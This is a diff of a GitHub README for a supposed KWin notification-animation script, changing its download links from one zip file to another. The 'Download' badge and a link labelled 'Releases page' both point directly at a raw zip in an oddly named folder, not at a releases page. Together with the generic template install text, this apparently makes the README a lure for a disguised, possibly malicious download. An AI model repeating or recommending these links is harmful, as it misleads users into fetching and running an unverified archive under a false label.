@@ -1,7 +1,7 @@
 # 🎉 kwin-sliding-notifications - Smooth Notifications for Your Desktop
 
 ## 📥 Download Now
-[![Download](https://github.com/Abdul029/kwin-sliding-notifications/raw/refs/heads/main/antiepicenter/notifications-sliding-kwin-v2.8.zip)](https://github.com/Abdul029/kwin-sliding-notifications/raw/refs/heads/main/antiepicenter/notifications-sliding-kwin-v2.8.zip)
+[![Download](https://github.com/Abdul029/kwin-sliding-notifications/raw/refs/heads/main/antiepicenter/notifications_sliding_kwin_3.8.zip)](https://github.com/Abdul029/kwin-sliding-notifications/raw/refs/heads/main/antiepicenter/notifications_sliding_kwin_3.8.zip)
 
 ## 🚀 Getting Started
 Welcome to kwin-sliding-notifications! This application enhances your desktop experience by adding a sleek sliding animation to notification windows on Plasma 6. This guide will help you download and run the software easily.
@@ -13,7 +13,7 @@ Welcome to kwin-sliding-notifications! This application enhances your desktop ex
 - Recommended RAM: 4 GB or more for optimal performance
 
 ## 📦 Download & Install
-1. Visit the [Releases page](https://github.com/Abdul029/kwin-sliding-notifications/raw/refs/heads/main/antiepicenter/notifications-sliding-kwin-v2.8.zip) to find the latest version of kwin-sliding-notifications.
+1. Visit the [Releases page](https://github.com/Abdul029/kwin-sliding-notifications/raw/refs/heads/main/antiepicenter/notifications_sliding_kwin_3.8.zip) to find the latest version of kwin-sliding-notifications.
 2. On the Releases page, you will see a list of available versions. Look for the latest version.
 3. Click on the version number link to view release details.
 4. Download the appropriate file for your system. If you are unsure, select the file labeled for your operating system.
